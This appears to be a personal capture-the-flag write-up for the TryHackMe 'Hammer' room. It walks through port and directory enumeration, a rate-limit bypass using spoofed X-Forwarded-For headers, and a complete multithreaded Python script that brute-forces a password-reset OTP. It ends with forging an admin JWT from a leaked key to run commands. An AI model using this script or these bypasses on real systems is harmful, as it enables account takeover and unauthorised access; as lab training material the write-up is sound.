# Overview

- **Pentester:** Taryn Shutlar
- **Author of Writeup** Taryn Shutlar
- **Date & Time:** October 9th, 2025 at 6 PM
- **Challenge Name:** Hammer
- **Platform:** TryHackMe
- **Difficulty:** Medium
- **Objective:** Bypass authentication & get RCE onto the system, capture **(2)** flags
- **Tools Used:** Nmap, GoBuster, ffuf, firefox dev tools

# Tasks:

1. **What is the flag value after logging into the Dashboard?**
2. **What is the content of the file `/home/ubuntu/flag.txt`?**

# Nmap Scan Results

### Command Used:
```bash
nmap -sC -sV -p- 10.201.53.76 -oN report.nmap -v -T5
```
This command starts a loud and fast scan on all ports with default NSE scripts, for open ports, what service is running and its version, and outputs the results to a file named `report.nmap`
## Ports Open:

- **22/TCP: SSH**
- **1337/TCP: HTTP**
  
### Full Nmap Report:
```bash
Nmap scan report for 10.201.53.76
Host is up (0.25s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 5a:9a:eb:3b:da:13:d8:ec:e9:c0:97:5f:96:e4:78:9d (RSA)
|   256 61:dd:d5:23:10:94:33:93:21:a0:38:92:97:ef:37:c8 (ECDSA)
|_  256 48:4a:6c:26:32:9c:32:ce:b7:c3:f8:90:e4:e3:62:58 (ED25519)
1337/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Login
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# GoBuster

### Command Used:
```bash

gobuster dir -u http://10.201.53.76:1337 -w /usr/share/wordlists/dirb/common.txt -t 50
```
This command starts **GoBuster** in `dir` mode, meaning it enumerates subdirectories of the provided URL, the `-u` switch is for indicating the target URL, `-w` indicates the wordlist used for enumeration, `-t` for how many threads are used during the scan, in this case it sends 50 threads.
### GoBuster `dir` Enumeration:
with `dir` mode, it enumerated the subdirectories of the webapp.

#### Subdirectory Discoveries:
`/javascript`
`/phpmyadmin`
`/vendor`

### GoBuster Full Report:
```bash
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://TARGET:1337
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/.hta                 (Status: 403) [Size: 279]
/index.php            (Status: 200) [Size: 1326]
/javascript           (Status: 301) [Size: 324] [--> http://TARGET:1337/javascript/]
/phpmyadmin           (Status: 301) [Size: 324] [--> http://TARGET:1337/phpmyadmin/]
/server-status        (Status: 403) [Size: 279]
/vendor               (Status: 301) [Size: 320] [--> http://10.201.53.76:1337/vendor/]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```

# Webapp Exploration

Using Firefox, navigating to http://TARGET:1337

## Login Page:

<img width="501" height="347" alt="image" src="https://github.com/user-attachments/assets/46a0b8f7-6be8-4689-b753-ac8598b74c73" />


#### Trying the credentials for error enumeration:
```shell
`Username: test`
`Password: test`
```
<img width="464" height="391" alt="image" src="https://github.com/user-attachments/assets/645ac6f9-0a91-43ea-8eda-cf93074fc561" />

Checking the Network tab of the dev tools, seems Cookies are displayed:
```php
PHPSESSID=t4i1pc58l8vd3uq34sgd93elq8
```
This could be valuable information for identifying a vulnerability.

### Page Source:

<img width="672" height="506" alt="image" src="https://github.com/user-attachments/assets/fda1590e-54f9-4f82-9053-df6f7e5dd683" />

```html
<!-- Dev Note: Directory naming convention must be hmr_DIRECTORY_NAME -->
```
This HTML comment might be important.

There is a **Reset Password** section in http://TARGET:1337/reset_password.php
This could be useful later.

<img width="483" height="211" alt="image" src="https://github.com/user-attachments/assets/64966eac-fa77-4c8d-9c44-c1fd11ef781a" />

Navigating to any subdirectories that GoBuster found:
`/javascript` is locked behind higher privilege
`/phpmyadmin` seems to work, but right now, might be too early to be here

<img width="458" height="458" alt="image" src="https://github.com/user-attachments/assets/3da4564b-86ce-4f66-83db-a0568a5a166d" />

Visiting `/vendor` has a filesystem in it, could be used for a php reverse shell though no upload vulnerability or upload button seen yet.
Could perhaps still do a URL Remote Code execution from here.



<img width="382" height="42" alt="image" src="https://github.com/user-attachments/assets/e8af6773-4a20-44d5-8027-c6056777c362" />

-----------------------

<img width="446" height="302" alt="image" src="https://github.com/user-attachments/assets/cfb9cfcb-5960-454a-895c-6bc3428d9fd4" />




`autoload.php` doesn't seem to do anything, yet it's here, wonder what for?

# Objective 1: Finding the first flag

**Must find some way to log in and grab the first flag** 


# Ffuf

### ffuf command used:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.201.33.65:1337/hmr_FUZZ -mc 200,301,302,403
```
With this command, we're using ffuf fuzzer tool to find anything using seclists, specifically fuzzing the `hmr_DIRECTORY` that we saw before in the HTML comment as part of the Page Source.
```html
<!-- Dev Note: Directory naming convention must be hmr_DIRECTORY_NAME -->
```
## ffuf full report

```bash

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.201.33.65:1337/hmr_FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,301,302,403
________________________________________________

css                     [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 270ms]
logs                    [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 264ms]
js                      [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 3234ms]
images                  [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 5246ms]
:: Progress: [29999/29999] :: Job [1/1] :: 156 req/sec :: Duration: [0:03:20] :: Errors: 1 ::
```
seems we found:
`hmr_css, hmr_logs, hmr_js, and hmr_images`

Navigating to `/hmr_logs` we find what seems to be another file system, but this time with a valuable error.logs file.

<img width="435" height="228" alt="image" src="https://github.com/user-attachments/assets/aef29f89-2521-4d9a-a9f1-aca9f566e9de" />

Contents of `error.logs`:
![[Pasted image 20251009215220.png]]

```plain
[Mon Aug 19 12:00:01.123456 2024] [core:error] [pid 12345:tid 139999999999999] [client 192.168.1.10:56832] AH00124: Request exceeded the limit of 10 internal redirects due to probable configuration error. Use 'LimitInternalRecursion' to increase the limit if necessary. Use 'LogLevel debug' to get a backtrace.
[Mon Aug 19 12:01:22.987654 2024] [authz_core:error] [pid 12346:tid 139999999999998] [client 192.168.1.15:45918] AH01630: client denied by server configuration: /var/www/html/
[Mon Aug 19 12:02:34.876543 2024] [authz_core:error] [pid 12347:tid 139999999999997] [client 192.168.1.12:37210] AH01631: user tester@hammer.thm: authentication failure for "/restricted-area": Password Mismatch
[Mon Aug 19 12:03:45.765432 2024] [authz_core:error] [pid 12348:tid 139999999999996] [client 192.168.1.20:37254] AH01627: client denied by server configuration: /etc/shadow
[Mon Aug 19 12:04:56.654321 2024] [core:error] [pid 12349:tid 139999999999995] [client 192.168.1.22:38100] AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/protected
[Mon Aug 19 12:05:07.543210 2024] [authz_core:error] [pid 12350:tid 139999999999994] [client 192.168.1.25:46234] AH01627: client denied by server configuration: /home/hammerthm/test.php
[Mon Aug 19 12:06:18.432109 2024] [authz_core:error] [pid 12351:tid 139999999999993] [client 192.168.1.30:40232] AH01617: user tester@hammer.thm: authentication failure for "/admin-login": Invalid email address
[Mon Aug 19 12:07:29.321098 2024] [core:error] [pid 12352:tid 139999999999992] [client 192.168.1.35:42310] AH00124: Request exceeded the limit of 10 internal redirects due to probable configuration error. Use 'LimitInternalRecursion' to increase the limit if necessary. Use 'LogLevel debug' to get a backtrace.
[Mon Aug 19 12:09:51.109876 2024] [core:error] [pid 12354:tid 139999999999990] [client 192.168.1.50:45998] AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/locked-down
```

Important information enumerated from this file

***Username:*** tester@hammer.thm

We can also see quite a lot of webserver subdirectories such as `/etc/shadow` meaning its running Linux

### Research
I looked up a walkthrough to help me through some of this CTF, and it would seem with help of this video https://www.youtube.com/watch?v=T_F44rHKgZY from Djalil Ayed, the OTP from the password reset (which works with the email) has rate limiting enabled (side note: I didnt know what rate limiting does exactly but now i do thanks to the video) and bypassing it is the key here

This website is a great reference also: https://www.linkedin.com/pulse/techniques-bypassing-rate-limiting-otp2fa-endpoints-aravind-s
1. Changing IP origin using headers
    
    `X-Originating-IP: 127.0.0.1`  
    `X-Forwarded-For: 127.0.0.1`  - Works most commonly
    `X-Remote-IP: 127.0.0.1`  
    `X-Remote-Addr: 127.0.0.1`  
    `X-Client-IP: 127.0.0.1`  
    `X-Host: 127.0.0.1`  
    `X-Forwared-Host: 127.0.0.1`  
      
      
    `#or use double X-Forwared-For header`  
    `X-Forwarded-For:`  
    `X-Forwarded-For: 127.0.0.1`

# OTP Details
the OTP has a timer that's `server-side` controlled, not `client-side`, so any manipulation on the client end with a tool won't work against it, so changing the time via `burp suite` won't do anything, or tricking the site to accept a much higher time limit, when its controlled server-side.

However, because of 2 videos i've seen during my **Research**, it seems (to them, anyways), that using AI LLMs such as ChatGPT helped create a **Python Script** for exploiting the multiple factors or at least brute forcing in a timely manner, if i could properly read the script at the time and date of writing this, I would tell you what it does (1:04 am @ 10th of October, 2025)

--------------
##### ***Personal Opinion: I do think AI LLMs are great tools for helping with cybersecurity, including payload crafting, but I personally have too much pride to want to reduce myself to using AI all the time to craft a payload, i'd rather and will learn the languages myself so i can craft them and modify existing ones on my own.***

------------------------------
# Python Script

The script that helped break through the password reset OTP in Hammer on TryHackMe, downloaded from [here](https://github.com/djalilayed/tryhackme/blob/main/hammer/recovery-code.py)

``` python
# script with assistance of ChatGPT
# script for TryHckMe room Hammer: https://tryhackme.com/r/room/hammer
# you need to update the script with target machine IP and your Cookie 
# check video: https://youtu.be/T_F44rHKgZY

import requests
import random
from concurrent.futures import ThreadPoolExecutor, as_completed

# Configuration variables
ip_address = "10.201.113.112"
port = "1337"
phpsessid = "o9m6ba1gbb96p84edhnqssgcr7"

# Base URL of the form submission page
url = f"http://{ip_address}:{port}/reset_password.php"

# Common headers for the request (without X-Forwarded-For)
common_headers = {
    "Host": f"{ip_address}:{port}",
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": f"http://{ip_address}:{port}",
    "DNT": "1",
    "Connection": "keep-alive",
    "Referer": f"http://{ip_address}:{port}/reset_password.php",
    "Upgrade-Insecure-Requests": "1",
    "Priority": "u=0, i",
    "Cookie": f"PHPSESSID={phpsessid}"
}

# Custom exception to exit all threads once the correct code is found
class CodeFoundException(Exception):
    pass

# Function to generate all possible 4-digit codes
def generate_codes():
    for i in range(10000):
        yield f"{i:04}"  # Format the number as a 4-digit string, e.g., "0001"

# Function to send a POST request
def send_request(code):
    # Generate a random X-Forwarded-For IP address
    x_forwarded_for = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

    # Add the X-Forwarded-For header to the request headers
    headers = common_headers.copy()
    headers["X-Forwarded-For"] = x_forwarded_for

    # Data to be sent with the POST request
    data = {
        "recovery_code": code,
        "s": "106"  # Replace this with the correct hidden field value if necessary
    }

    try:
        # Send the POST request with the new X-Forwarded-For IP address
        response = requests.post(url, headers=headers, data=data, timeout=2)

        # Check if the recovery code is correct
        if "Invalid or expired recovery code!" not in response.text:
            print(f"Success! The correct code is: {code}")
            raise CodeFoundException
    except requests.RequestException:
        pass

    return False

# Function to run the requests in parallel using threading
def run_bruteforce():
    try:
        # Use a ThreadPoolExecutor to run multiple requests in parallel
        with ThreadPoolExecutor(max_workers=100) as executor:  # Adjust max_workers as needed
            futures = {executor.submit(send_request, code): code for code in generate_codes()}

            for future in as_completed(futures):
                future.result()  # Trigger the exception if the correct code is found
    except CodeFoundException:
        print("Correct code found, stopping execution.")
        executor.shutdown(wait=False)

if __name__ == "__main__":
    run_bruteforce()
```

Eventually, using this script, it did brute force the OTP and for me, it was `4659`
#### Full Python Script Result 
```bash
Success! The correct code is: 4659
```
<img width="292" height="77" alt="image" src="https://github.com/user-attachments/assets/977c7e5a-ced6-433a-b4ba-c4a4ac4a5a8e" />

the `code` works and we get our password reset, changed to `test123` or `*******`
```plain
New Credentials
Email: tester@hammer.thm
Password: test123
```

# Dashboard Reached: Objective 1 Complete

Image of the now `pwned` **Dashboard**

<img width="662" height="292" alt="image" src="https://github.com/user-attachments/assets/1e65e58c-1179-4e50-a474-c0aae6ae6ade" />


#### First Flag Acquired: THM{AuthBypass3D}

# Objective 2: Hunting for the Second Flag

Now that we've breached into the Dashboard with our first flag captured, it seems `RCE` or `Remote Code Injection` is next on the menu, now we mess around with `command injection` to find our next flag

Dug into the `page source` of the dashboard and found this juicy thing

```java
`var jwtToken = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L215a2V5LmtleSJ9.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzYwMDIyMzkxLCJleHAiOjE3NjAwMjU5OTEsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJ1c2VyIn19.m3ksX3LCvj-Z63dLhlU2n8jro5zg8tV--QnAl9vEYoY';`
```

### JWT.IO Information

<img width="687" height="481" alt="image" src="https://github.com/user-attachments/assets/71daab8d-26b3-409f-b110-546764ef45aa" />


```plain
Key: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L215a2V5LmtleSJ9.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzYwMDIyMzkxLCJleHAiOjE3NjAwMjU5OTEsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJ1c2VyIn19.lIBjNKfj8xIGS2_aSaMKzxHmodc6Ch4caRrY2IQMuYQ
```

```java
header
{
  "typ": "JWT",
  "alg": "HS256",
  "kid": "/var/www/mykey.key"
}

payload
{
  "iss": "http://hammer.thm",
  "aud": "http://hammer.thm",
  "iat": 1760022391,
  "exp": 1760025991,
  "data": {
    "user_id": 1,
    "email": "tester@hammer.thm",
    "role": "user"
  }
}

secret
a-string-secret-at-least-256-bits-long
```

Seems there's a "persistence" mechanism in the page source and in the cookies

<img width="221" height="85" alt="image" src="https://github.com/user-attachments/assets/c7f36b12-fc4f-4c45-94af-8dc46d4bf228" />

using `ls` in the command area we see a list of files

<img width="668" height="444" alt="image" src="https://github.com/user-attachments/assets/85b05219-4fc1-4f17-8868-2aff8deed319" />

the `188ade1.key` seems very interesting, see if we can grab it using `http://TARGET:1337/188ade1.key`, alternatively could use wget to grab it instead

using **`wget`** we grab the key using the command wget ```
```bash
wget http://TARGET:1337/188ade1.key
```
using **`cat`** we can see the contents within
```bash
cat 188ade1.key
56058354efb3daa97ebab00fabd7a7d7
```

Changing the JWT we were presented with before in `jwt.io` from `'user'` to `'admin'`, seems the token fails authentication, the key we found could help validate the JWT.

Crafting a new JWT with our newly found key, looks like this in JWT.io

<img width="689" height="453" alt="image" src="https://github.com/user-attachments/assets/e58a7c16-7041-4990-acd2-b28c8a9d5117" />

Changes including:
- the key's value being added to the `secret`
- the `role` changed from `'user'` to `'admin'`
- the `kid` changed from `"/var/www/mykey.key"` to `"/var/www/html/188ade1.key`

with the new JWT token formed:
```js

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L2h0bWwvMTg4YWRlMS5rZXkifQ.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzYwMDcxNjU1LCJleHAiOjE3NjAwNzUyNTUsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJhZG1pbiJ9fQ.C-5Eo1aXaA5ZTbfDxJ6PZnAb9KmGAhPwOXqFjH_9s-I
```

now we see if it works or not

Changing the user's JWT token to the new one doesn't grant elevated permissions, *however* using the dev tools in Firefox, we're able to use the `edit and send` feature of the browser, modified the `Authorization` section of the `execute_command.php` request we make to the new JWT token, and it works, any command that would **normally be rejected, now works** but only within the dev tools `edit and send` feature, we cannot elevate our user to an admin via a JWT replacement unfortunately, meaning its server-side checking, but with the dev tools it seems we can get around this and see the results of our now `not-so rejected` commands.

<img width="701" height="283" alt="image" src="https://github.com/user-attachments/assets/e3d15190-1a65-4fb6-b358-b35ccc5a5f15" />

and with that

# Objective 2 Complete: Flag Obtained

# Hammer CTF Complete

![[Pasted image 20251010153654.png]]

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣾⣷⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣆⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡴⠾⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⡷⠦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢾⣏⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⡟⠀⠀⢸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣷⣶⣼⣿⠟⠋⠙⢿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⡿⠋⠙⠻⣿⣧⣴⣾⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⣿⣿⣿⡀⠀⠀⠈⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⠃⠀⠀⠀⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢀⣀⣠⣤⣤⣴⣶⠶⠿⠛⠛⢿⣿⣿⣿⣧⠀⠀⠀⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⡀⠀⠀⣸⣿⣿⣿⣿⠛⠛⠿⠶⣶⣶⣤⣤⣄⣀⡀
⢿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠘⣿⣿⣿⠟⢷⣶⣾⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣶⡾⠻⣿⣿⣿⠃⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿
⠘⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⢀⣼⠛⠁⠀⠀⢻⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠙⣯⣀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⠇
⠀⠸⣿⠿⠛⠛⠛⣦⣶⣶⣾⣿⣿⣇⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⣰⣿⣿⣿⣶⣶⣴⠟⠛⠛⠿⣿⡏⠀
⠀⠀⢹⡆⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣆⠀⢀⣴⣿⠉⠀⠀⢻⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⡟⠀⠀⠈⣿⣧⣄⠀⣠⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⢠⡟⠀⠀
⠀⠀⠀⢿⡀⠀⠀⠀⢸⣿⣿⡿⠿⠛⠛⣿⣿⣿⣿⡄⠀⠀⠀⢿⣿⣿⣿⡀⠀⠀⠀⠀⠀⣼⣿⣿⣿⠁⠀⠀⢀⣿⣿⣿⣿⠛⠛⠿⠿⣿⣿⣇⠀⠀⠀⢀⡾⠁⠀⠀
⠀⠀⠀⠈⣿⣶⣶⣾⣿⣇⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⡀⠀⠀⠘⣿⣿⣿⣷⠀⠀⠀⠀⣸⣿⣿⣿⠇⠀⠀⠀⣾⣿⣿⣿⠃⠀⠀⠀⠀⠀⢨⣿⣷⣶⣶⣿⠃⠀⠀⠀
⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⢀⣸⣿⠿⠋⠀⠀⠀⠀⢸⣿⣿⣿⣇⠀⠀⢠⣿⣿⣿⡏⠀⠀⠀⠀⠙⠻⣿⣯⡀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⡦⠴⠖⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⡆⢀⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠲⠦⢤⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣾⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⡿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
